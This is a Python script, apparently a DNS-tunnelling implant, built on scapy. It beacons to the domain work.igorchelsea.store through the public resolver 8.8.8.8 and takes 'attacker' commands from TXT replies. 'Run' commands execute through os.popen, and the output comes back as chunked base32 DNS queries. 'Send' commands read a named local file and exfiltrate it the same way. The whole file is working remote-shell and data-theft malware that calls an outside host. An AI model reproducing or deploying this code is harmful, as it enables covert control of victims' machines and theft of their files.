from scapy.all import sr,IP,ICMP,Raw,sniff,send,DNS,UDP,DNSQR,sr1,Ether,DNSRR,sendp
import threading
import time
import os
import base64

DNS_SERVER = "8.8.8.8" 
INTERFACE = "enp8s0f1"
START_MSG = "IMREADY"
PORT = int(53)
URL = "work.igorchelsea.store"
TXT_TYPE = int(16)
file_buffer = ""
file_name = ""
is_transfer = False
MAX_FREG_SIZE = int(63)

BEACON_TYPE = "0"
CHUNK_TYPE = "1"
EOO_TYPE = "2"
EOF_TYPE = "3"


PACKET_FILTER = " and ".join([
    "udp dst port 53"       #Filter UDP port 53
    #"udp[10] & 0x80 = 0"     # DNS queries only
    ])


def Base32Decode(sinput):
    sinput_decoded = base64.b32decode(sinput.encode()).decode()
    return sinput_decoded
    
def Base32Encode(sinput):
    sinput_encoded = base64.b32encode(sinput.encode()).decode()
    return sinput_encoded


def Base64Decode(sinput):
    sinput_decoded = base64.b64decode(sinput.encode()).decode()
    return sinput_decoded


def chunker(base64_string):
    chunk_size = 40
    return [base64_string[i:i+chunk_size] for i in range(0, len(base64_string), chunk_size)]


def dns_send(payload):
    
    if payload == EOO_TYPE or payload ==  EOF_TYPE:
        print("Sent the EOF")
        b32_type = Base32Encode(payload)
        request = IP(dst=DNS_SERVER)/UDP(dport=PORT)/DNS(rd=1,qd=DNSQR(qname=b32_type+"."+URL,qtype="TXT"))
        sr1(request,verbose = 0)
    else:        
        print("Sent the chunk")
        b32_encoded = Base32Encode(payload)
        chunks_of_b32 = chunker(b32_encoded)
        print(f"number of chunks is {len(chunks_of_b32)}")
        for chunk in chunks_of_b32:
            b32_type = Base32Encode(CHUNK_TYPE)
            request = IP(dst=DNS_SERVER)/UDP(dport=PORT)/DNS(rd=1,qd=DNSQR(qname=b32_type+"."+chunk+"."+URL,qtype="TXT"))
            sr1(request,verbose = 0)


def send_file(file_name):

    try:

        with open(file_name, "r") as file:
            file_data = file.read()

        dns_send(file_data)
        dns_send(EOF_TYPE)     

    except Exception as e:
        print(f"ERROR: Could not send file {file_name}. Reason: {str(e)}")






def handle_response(packet):

    command_from_attacker = packet[DNSRR].rdata[0].decode()
    print(command_from_attacker)
    print(f"Got response from - {packet[IP].src}")
    if command_from_attacker.startswith("Run "):
        x = command_from_attacker.split("Run ",1)[1]
        inside_data = os.popen(x)
        output = inside_data.read()
        print(f"cmdoutput:{output}")
        dns_send(output)
        dns_send(EOO_TYPE)
        time.sleep(0.5)
    elif command_from_attacker.startswith("Exit"):
        print("------------------------")
        print("Attacker finished Bye")
        print("------------------------")
        exit()
    if command_from_attacker.startswith("Send "):
        file_name = command_from_attacker.split("Send ",1)[1]
        send_file(file_name)



def send_init_message():
    
    while True:
        print("Sending BEACON Message")
        encoded32_type = Base32Encode(BEACON_TYPE)
        payload = Base32Encode(START_MSG)
        request = IP(dst=DNS_SERVER)/UDP(dport=PORT)/DNS(rd=1,qd=DNSQR(qname=encoded32_type+"."+payload+"."+URL,qtype="TXT"))
        answer = sr1(request,verbose=0)
        if answer.haslayer(DNSRR) and answer[DNSRR].type == TXT_TYPE:
            handle_response(answer)
        else:
            pass
        time.sleep(0.5)



def main():

    send_init_message()
    

if __name__ == "__main__":
    main()

